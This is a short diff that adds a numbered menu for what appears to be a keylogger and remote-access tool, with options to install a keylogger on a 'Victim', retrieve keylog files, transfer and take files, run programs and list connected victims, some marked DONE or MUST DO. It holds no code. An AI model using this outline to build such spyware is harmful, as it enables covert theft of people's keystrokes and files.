@@ -1,0 +1,15 @@
+==================================================================================================
+1 - Start Keylogger (MUST DO)
+2 - Stop Keylogger (MUST DO)
+3 - Transfer Keylog Program to Victim   (DONE)
+4 - Get Keylog File from Victim
+5 - Disconnect from Victim  (DONE)
+6 - Transfer a file to a Victim
+7 - Get a file from a Victim
+8 - Run program
+9 - Watch file
+10 - Watch directory
+11 - Get List of All Connected Victim(s)
+12 - Connect to a Specific Victim   (DONE)
+13 - Uninstall
+==================================================================================================
